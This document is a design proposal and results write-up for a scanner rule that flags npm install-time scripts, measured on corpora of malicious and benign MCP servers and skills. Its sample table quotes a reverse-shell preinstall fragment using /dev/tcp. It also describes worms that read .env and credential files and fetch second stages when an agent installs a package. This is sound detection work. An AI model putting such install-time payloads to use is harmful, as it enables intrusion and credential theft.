<!-- SPDX-License-Identifier: MIT -->
# 129 — A package whose `preinstall` runs a 4 MB file the scanner did not read scores 88 to 100: no rule reads a `package.json`'s install-time scripts

- **Source**: the maintainer, 2026-11-17 ("进行其他的优化项目", after P-118's rejection); the per-sample comparison of
  today's misses against cc-audit on the full corpus (`c314e4d9`)
- **Depends on**: none
- **Branch**: `p/129-npm-install-scripts-unread`

## Problem

npm runs a package's `preinstall`, `install` and `postinstall` scripts on the installing machine, with no prompt, before
any of the package's own code is used. An MCP server configured as `npx -y <package>` gets them on its first launch; a
skill that tells the agent to `npm install` in a directory it ships gets them when the agent obeys. It is how the npm
worm families in the corpus start.

No rule reads those scripts. `package.json` is scanned as text, and a command like `node bundle.js` matches nothing. The
file it names is where the attack is, and in the wild that file is built to be unreadable: three of the four below are
one line of 2 to 4 MB, over the 1 MiB cap, so the only thing the report says is a `COV-000` note, which does not move
the score. The one file the package runs at install is the one file that was not read.

Static on `main` (`17d7bb0`, corpus `c314e4d9`, `agent-guard-work/runs/2026-11-17-static-main/`). All ten malicious
trees with an install-time script:

| sample | script | what it runs | today |
|---|---|---|---|
| `dd-npm-knowledge-graph-workflow-exfil` (wild) | `postInstall: node bundle.js` | 3.7 MB on one line | **100, no finding** |
| `dd-npm-redhat-kessel-mcp-worm` (wild) | `preinstall: node index.js` | 4.3 MB on one line, an `eval` wrapper | **88, nothing high** |
| `dd-npm-squawk-mcp-router-worm` (wild) | `preinstall: node setup.mjs` | 204 readable lines that download Bun and run a second file; the package ships a 2.3 MB one-line `router_init.js` | **83, nothing high** |
| `dd-npm-fixthis-exchange-exfil` (wild) | `postinstall: node src/utilities/setup_fixthis.js` | 13 KB on 3 lines, a hex-array string lookup | **76, nothing high** (`EXEC-004`, `BD-002` medium) |
| `sc-T9-supply-chain-easy` (fixture) | `postinstall: node -e "…"` | inline code: reads `.env*` two directories up and writes them to a log file | **95, nothing high** |
| `dd-npm-antv-mcp-chart-preinstall` (wild) | `preinstall: bun run index.js` | 0.5 MB on one line | high, by `EXFIL-001` in the file |
| `dd-npm-lanyer640-runcommand-revshell` (wild) | `preinstall: sh -i >& /dev/tcp/…` | the script is the reverse shell | high, by `BD-004` |
| `dd-npm-postman-mcp-shai-hulud` (wild) | `preinstall: node setup_bun.js` | a readable downloader | high, by `EXEC-001`/`EXFIL-001` |
| `dd-npm-namecheap-affiliate-injection` (wild) | `postinstall: node -e "console.log(…)"` | prints a notice | high, by `EXFIL-001` elsewhere |
| `sc-T9-supply-chain-medium` (fixture) | `postinstall: node -e "…"` | inline code reading credential paths | high, by `FS-001` |

Five of the ten are missed, four of them in the wild; the five that are caught are caught by something else in the
tree, not by the script.

The benign side is small. 163 benign trees carry a `package.json` (119 MCP servers, 44 skills) and four have an
install-time script: `playwright install chromium`; `test -f dist/index.js && node dist/index.js --check-binary || echo …`;
and `./install.sh` twice (one author, 76 and 87 readable lines: `mkdir`, `chmod`, a data file). `prepare` is on 54 benign
trees and 6 malicious ones and is not install-time for a consumer (npm runs it on publish and on a git install), so it
is not part of this.

Where it shows: the in-the-wild MCP row of the comparison is 5 of 12 today against cc-audit's 12 of 12, and four of the
seven misses are the first four rows above. The other three (`excluder`, `todo-wallet`, `iflow`) are in the JavaScript
server body and are not this proposal.

## Initial direction

A static rule on `package.json` install-time scripts, built like the hook audit: the script's command is its own unit
with the full rule set, and a local file it runs is followed one level. High when what it runs cannot be reviewed (over
the cap, or one very long line) or carries findings of its own, on `HOOK-002`'s reasoning that something run unread is
risk and not only a coverage note; medium for any other install-time script, reported and not gating. Touches
`internal/detect` (a unit builder, the rule, `rulesEpoch`) and `docs/rules.md`; measured on the static bench, which
costs nothing. The line to design: the five missed rows at high with none of the four benign ones.

## Done criteria

Code:

- [x] The tree reader raises one finding per install-time script of every `package.json` it reads (not under
  `node_modules/`, which stays unread): `scripts` keys equal to `preinstall`, `install` or `postinstall` ignoring case.
  `SUP-008` (high, dimension 5) when a reason below holds, otherwise `SUP-009` (medium, dimension 5). Never both for
  one script.
- [x] `SUP-008`'s reasons, each named in the finding:
  1. the script runs a local file that is in the tree and was **not read** (over the 1 MiB cap, or not a text file
     the scan reads);
  2. it runs a local file with **a line of 4,096 bytes or more** (the longest line in any file a benign script runs
     is 466; the shortest of the four malicious ones is 13,051);
  3. it runs a local file that **both names a network client and starts a process** on non-comment lines
     (`networkCapableRE`, and `EXEC-004`'s pattern: no second word list);
  4. it is **inline interpreter code** (`node -e`, `python -c`, …) that loads a module or touches files, the network,
     the environment or processes. Inline code that only prints is `SUP-009`.
     **Changed after the reading (2026-11-17, see Readings)**: narrowed to inline code that reads or writes files,
     reads the environment, opens the network, starts a process or evaluates code. A bare `require(` or `fs.` is no
     longer a reason; all four runs were repeated on the narrowed build.
- [x] A local file is a word with a script extension (`scriptRefs`), a `./` word, or the word after an interpreter,
  resolved against the `package.json`'s directory, with Node's `.js`/`.mjs`/`.cjs` fallback. One hop through
  `npm run <name>` (also `yarn`, `pnpm`, `bun run`) to another script of the same file. A file outside the tree or
  absent from it is not followed and not opened; the `SUP-009` says it was not read.
- [x] A key that differs from npm's name only by case (`postInstall`) is reported the same, and the finding says npm
  runs only the lowercase name.
- [x] Reverse assertions: `prepare`, `build`, `test`, `start` never raise either rule; `playwright install chromium`
  and a readable `install.sh` are `SUP-009`; a `package.json` under `node_modules/` raises nothing; two identical
  `package.json` files in two directories are each judged against their own directory; the check opens no file the
  walk did not already read.
- [x] `rulesEpoch` 16 → 17, `make docs` regenerates `docs/rules.md` with both IDs, `TestEveryRuleIDIsDocumented` green.
- [x] `make verify` green, read from its own exit code.

Measurement (static, threshold high, corpus `c314e4d9`, `main` at `17d7bb0` against the branch). Lines set before the
run:

- [x] **Target**: each of the five missed samples carries a high `SUP-008`: `dd-npm-fixthis-exchange-exfil`,
  `dd-npm-knowledge-graph-workflow-exfil`, `dd-npm-redhat-kessel-mcp-worm`, `dd-npm-squawk-mcp-router-worm`,
  `sc-T9-supply-chain-easy`. Five of five.
- [x] **Malicious**: no sample flagged on `main` is unflagged on the branch.
- [ ] **Benign**: no benign sample, alert-justified ones included, carries `SUP-008`, and the count flagged at high is
  the same as on `main`. The four benign install scripts carry `SUP-009`.
  (Met except the last sentence: three of four, see Readings.)
- [x] **Hard negatives**: the same samples flagged as on `main`.
- [x] **Held-out** (`heldout-all`, totals only, never read per sample): malicious flagged not lower than `main`;
  benign flagged at most one more than `main`.
- [x] **Read, not gated**: a measurement-only build that treats every script name as install-time, on the benign
  trees: how many would carry `SUP-008`, by reason. The offline proxy said none for reasons 1 and 2 and 3 of 56 for
  reason 3.
- [x] **Read, not gated**: a scan of the maintainer's own `~/.claude` on `main` and on the branch differs only by
  `SUP-008`/`SUP-009` findings, and their count is reported.

## Out of scope

- `prepare`, `prepublish` and other lifecycle names (54 benign trees carry `prepare`); `binding.gyp` builds, which npm
  runs with no script at all.
- Python's `setup.py` and build hooks; any other package manager.
- Dependencies: `node_modules/` stays unread, and a package `npx` fetches at run time is not on disk to read.
- Following more than one file, more than one `npm run` hop, or what the followed file itself runs (squawk's second
  stage is caught by reason 3 on the first).
- The 1 MiB cap and the `COV-000` note for files over it: unchanged.
- The three in-the-wild misses in the JavaScript server body (`excluder`, `todo-wallet`, `iflow`), and the judge.

## Must not claim

- Not "detects npm malware" or "supply-chain protection". It reads install-time scripts of the `package.json` files in
  a tree that is scanned: ten malicious trees in the corpus have one, four benign.
- Not that a `SUP-008` file is malicious. The finding says what was not, or cannot be, reviewed; a legitimate package
  whose install script runs its own minified bundle gets it too.
- Not that `postInstall` runs. The finding says npm does not run that spelling.
- The numbers are from the development corpus, and the thresholds were set after reading its samples; the held-out
  totals are the only figure not exposed to that.

## Work items

| W | In one sentence | Commit message |
|---|---|---|
| 1 | The tree reader's install-script check, `SUP-008`/`SUP-009`, tests, epoch, generated rules doc | `detect: a package.json's install-time scripts are read and what they run is followed one level (P-129)` |
| 2 | `.claude/rules/detect.md`, the architecture pair if it lists structural checks | `docs: the install-time script check (P-129)` |
| 3 | Static runs, corpus and held-out, main and branch; the two readings | `baselines: P-129 static runs, main and branch, corpus and held-out (P-129)` |
| 4 | Done, `complete/` or `rejected/`, the index row | `proposals: P-129 done (P-129)` |

## Open questions

All asked at once (2026-11-17). Each had a recommended answer.

1. **A readable install script that downloads and runs (squawk).** Recommended: reason 3, a file that both reaches the
   network and starts a process. The wider clause, any medium-or-higher finding in the file, would fire on 17 of 56
   benign trees if their ordinary scripts were install-time (mostly `EXEC-004`); reason 3 on 3 of 56; no clause leaves
   squawk missed.
   **Decided (2026-11-17)**: reason 3.
2. **`postInstall`, which npm does not run.** Recommended: report it the same and say so. It points at a 3.7 MB file,
   one letter from working, and no benign tree has a lifecycle name in the wrong case.
   **Decided (2026-11-17)**: reported, with the sentence.
3. **An ordinary install-time script.** Recommended: medium (`SUP-009`), as `HOOK-002` is for a hook script that was
   not audited: in the report, lowers the score, does not fail `check`.
   **Decided (2026-11-17)**: medium.

## Readings for design

`agent-guard-work/p129-sim.py` (a prototype of the rule over the corpus) and `p129-proxy.py`, both offline:

- Prototype with reasons 1 to 4 as designed, except its file-finding clause was "any medium-or-higher finding": the
  ten malicious install scripts all high (five newly caught), the four benign ones medium.
- Proxy for the false-positive side: every script of any name that runs a local file present in the tree, 56 benign
  trees. Over the cap or a 5,000-character line: 0. Network call plus process spawn: 3. Any medium-or-higher finding:
  17. Not in the tree (`node dist/index.js` before a build): 46.
- Longest line in a file a script runs: benign 466 characters (151 files); malicious 4.3 MB, 3.7 MB, 498 KB, 13 KB,
  then 512.

## Readings

Static, threshold high, corpus `c314e4d9` (5,272 samples), `main` at `17d7bb0` (`rules=400eaf0b1400`) against the
branch at `9ac04b6` (`rules=dbd22857f91a`), both built 2026-11-17:
`baselines/results/aguard/2026-11-17-p129-corpus-{main,changed}`; held-out is the `heldout-all` list (243 malicious, 216
benign; layer 2, not in the corpus): `…-p129-heldout-{main,changed}`. `compare.txt` in `corpus-changed` has every line
and every sample carrying either rule.

| line (set before the run) | main | branch | |
|---|---:|---:|---|
| the five missed samples carry a high `SUP-008` | 0 | **5** | 5 of 5 ✓ |
| malicious flagged, of 719; none lost | 226 | **231** | ✓ (the five targets, nothing else moved) |
| benign carrying `SUP-008`, of 4,534 | — | 0 | 0 ✓ |
| benign flagged at high, of 4,534 (4,467 without alert-justified: 326 → 326) | 342 | 342 | same samples ✓ |
| the four benign install scripts carry `SUP-009` | — | **3** | 4 ✗ as written, see below |
| hard negatives flagged, of 19 | 4 | 4 | same samples ✓ |
| held-out malicious flagged, of 243 | 80 | 80 | not lower ✓ |
| held-out benign flagged, of 216 | 6 | 6 | at most one more ✓ |

**The line that is not met as written.** `ben-mcp-gh-bradleygolden-hexdocs-mcp` has no `SUP-009` in the run. The
benchmark places that sample as an `.mcp.json` entry in a fake home, so its tree is not read on either build and no
rule sees its `package.json`. Handed to `check` as a directory the same tree gets `SUP-009` (medium, "Not in this tree,
so not read: dist/index.js"). The rule behaves as designed on it; the line assumed the run would read the tree.

**All ten malicious install scripts.** Eight are `SUP-008` (the five targets, and `antv`, `postman-shai-hulud`,
`sc-T9-supply-chain-medium`, already flagged by other rules); two are `SUP-009`: `lanyer640` (the script is a reverse
shell, flagged by `BD-004` on that line) and `namecheap` (`node -e "console.log(…)"`, flagged by `EXFIL-001` elsewhere).
Held-out: no sample carries either rule.

**Read, not gated: every script name as install-time** (`any-script-reading.txt` in `corpus-changed`; a build with
that one line changed, never committed; each of the 163 benign trees with a `package.json` handed to `check`). First
build: `SUP-008` on 12 trees, 15 of its 23 findings one idiom, `node -e "require('fs').chmodSync('build/index.js', '755')"`
after a build, reached through `npm run build`. That is what a `postinstall` of `npm run build` would have hit, so
reason 4 was narrowed (above) and everything was run again: `SUP-008` on **4 of 163**, all by reason 3 (a test file or
a CLI script that fetches and starts a process); reasons 1, 2 and 4: none. The gated lines are the same on both builds.

**Read, not gated: the maintainer's own `~/.claude`** (99 artifacts): 83 findings on `main` and 83 on the branch, the
same ones; neither rule fires.
